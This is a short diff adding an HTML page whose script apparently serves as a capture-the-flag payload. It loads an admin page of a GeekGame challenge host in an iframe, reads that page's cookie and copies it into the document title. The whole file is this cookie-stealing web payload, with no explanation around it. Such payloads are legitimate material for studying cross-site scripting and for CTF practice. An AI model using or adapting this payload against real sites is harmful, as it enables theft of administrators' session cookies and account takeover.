@@ -1,0 +1,18 @@
+<body>
+<a>test</a>
+
+<script>
+
+xc=function(src){
+ var o = document.createElement("iframe");
+ o.src = src;
+ document.getElementsByTagName("body")[0].appendChild(o);
+ o.onload=function()
+ {
+     d=o.contentDocument||o.contentDocument.document;
+     document.title=d.cookie;
+ };
+}("http://prob99-n563bq5c.geekgame.pku.edu.cn/admin/");
+
+</script>
+</body>
